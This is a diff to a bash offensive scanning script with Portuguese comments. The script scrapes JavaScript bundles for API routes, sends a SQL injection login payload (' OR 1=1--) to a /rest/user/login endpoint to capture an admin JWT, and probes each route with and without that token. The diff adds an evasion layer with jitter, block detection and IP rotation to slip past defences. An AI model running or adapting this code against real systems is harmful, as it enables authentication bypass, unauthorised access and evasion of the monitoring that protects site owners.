@@ -13,6 +13,10 @@
 #   3. Deduplica e filtra assets/CDN
 #   4. Testa cada endpoint com GET (sem auth) e GET com JWT (se disponível)
 #   5. Emite: API_ENDPOINT_FOUND: <method> <path> (HTTP <code>, <size>B, <auth>)
+#
+# EVASÃO (evasion_lib.sh): budget global, jitter, detecção de bloqueio com
+# rotação de IP, 1 request onde antes eram 2, pula portas emuladas, aborto
+# gracioso. enabled=0 → padrão de requests idêntico ao original.
 # ==============================================================================
 set -u
 
@@ -23,20 +27,30 @@ CURL_OPTS="-sk --max-time 20"
 TMPD="$(mktemp -d)"
 trap 'rm -rf "$TMPD"' EXIT
 
+# ---- Camada de evasão -----------------------------------------------------------
+_EV_LIB="$(dirname "${BASH_SOURCE[0]}")/evasion_lib.sh"
+[ -f "$_EV_LIB" ] || _EV_LIB="/ruadan/evasion_lib.sh"
+. "$_EV_LIB"
+ev_init "$TARGET" "$PORT" "$SCHEME"
+ev_skip_port && exit 0
+ev_should_abort && exit 0
+
 BASE_URL="${SCHEME}://${TARGET}:${PORT}"
 if [ "$SCHEME" = "http" ]; then
-    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
+    _redir=$(curl $CURL_OPTS ${EV__IDA[@]+"${EV__IDA[@]}"} -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
     if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
         echo "[api-extract] ${BASE_URL} redireciona para HTTPS — usando ${_redir%/}" >&2
         BASE_URL="${_redir%/}"
     fi
 fi
+ev_set_probe_url "${BASE_URL}/"
 echo "[api-extract] Alvo: ${BASE_URL}"
 
 # Tenta capturar JWT do SQLi probe (se já rodou)
 JWT=""
 LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
-LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
+ev_body $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY"
+LOGIN_RESP="$EV_BODY"
 JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
 if [ -n "$JWT" ]; then
     echo "[api-extract] JWT admin capturado (${#JWT} chars) — endpoints autenticados serão testados"
@@ -45,7 +59,7 @@ else
 fi
 
 # ---- 1. Baixa index.html e descobre bundles JS --------------------------------
-curl $CURL_OPTS "${BASE_URL}/" -o "${TMPD}/index.html" 2>/dev/null
+ev_code_bodyfile "${TMPD}/index.html" $CURL_OPTS "${BASE_URL}/"
 [ -s "${TMPD}/index.html" ] || { echo "[api-extract][ERRO] index.html vazio"; exit 0; }
 
 JS_FILES=$(grep -oE '(src|href)="[^"]*\.js"' "${TMPD}/index.html" | sed 's/.*="//;s/"//' | sort -u)
@@ -56,12 +70,13 @@ API_RAW="${TMPD}/api_raw.txt"
 : > "$API_RAW"
 
 for js in $JS_FILES; do
+    ev_should_abort && exit 0
     case "$js" in
         http*) url="$js" ;;
         /*)     url="${BASE_URL}${js}" ;;
         *)      url="${BASE_URL}/${js}" ;;
     esac
-    curl $CURL_OPTS "$url" -o "${TMPD}/bundle.js" 2>/dev/null
+    ev_code_bodyfile "${TMPD}/bundle.js" $CURL_OPTS "$url"
     [ -s "${TMPD}/bundle.js" ] || continue
 
     # Regex para endpoints de API (vários padrões de código)
@@ -107,26 +122,27 @@ echo "[api-extract] Endpoints de API extraídos: ${N_API}"
 [ "$N_API" -eq 0 ] && exit 0
 
 # ---- 4. Testa cada endpoint (sem auth + com auth se JWT) ----------------------
-BASELINE_CODE=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${BASE_URL}/ruadan-nonexist-$(date +%s)" 2>/dev/null)
-BASELINE_SIZE=$(curl $CURL_OPTS -o /dev/null -w "%{size_download}" "${BASE_URL}/ruadan-nonexist-$(date +%s)" 2>/dev/null)
+ev_code_size $CURL_OPTS "${BASE_URL}/ruadan-nonexist-$(date +%s)"
+BASELINE_CODE="$EV_CODE"; BASELINE_SIZE="$EV_SIZE"
 echo "[api-extract] Baseline (catch-all): HTTP ${BASELINE_CODE} / ${BASELINE_SIZE}B"
 
 FOUND=0
 while read -r route; do
     [ -z "$route" ] && continue
+    ev_should_abort && exit 0
     # Substitui :id por 1 (parâmetros REST)
     test_route=$(echo "$route" | sed 's/:[a-zA-Z]*/1/g')
 
     # Teste GET sem auth
-    code_noauth=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${BASE_URL}${test_route}" 2>/dev/null)
-    size_noauth=$(curl $CURL_OPTS -o /dev/null -w "%{size_download}" "${BASE_URL}${test_route}" 2>/dev/null)
+    ev_code_size $CURL_OPTS "${BASE_URL}${test_route}"
+    code_noauth="$EV_CODE"; size_noauth="$EV_SIZE"
 
     # Teste GET com auth (se temos JWT)
     code_auth=""
     size_auth=""
     if [ -n "$JWT" ]; then
-        code_auth=$(curl $CURL_OPTS -H "Authorization: Bearer $JWT" -o /dev/null -w "%{http_code}" "${BASE_URL}${test_route}" 2>/dev/null)
-        size_auth=$(curl $CURL_OPTS -H "Authorization: Bearer $JWT" -o /dev/null -w "%{size_download}" "${BASE_URL}${test_route}" 2>/dev/null)
+        ev_code_size $CURL_OPTS -H "Authorization: Bearer $JWT" "${BASE_URL}${test_route}"
+        code_auth="$EV_CODE"; size_auth="$EV_SIZE"
     fi
 
     # Reporta se difere do baseline OU tem auth diferente de sem auth
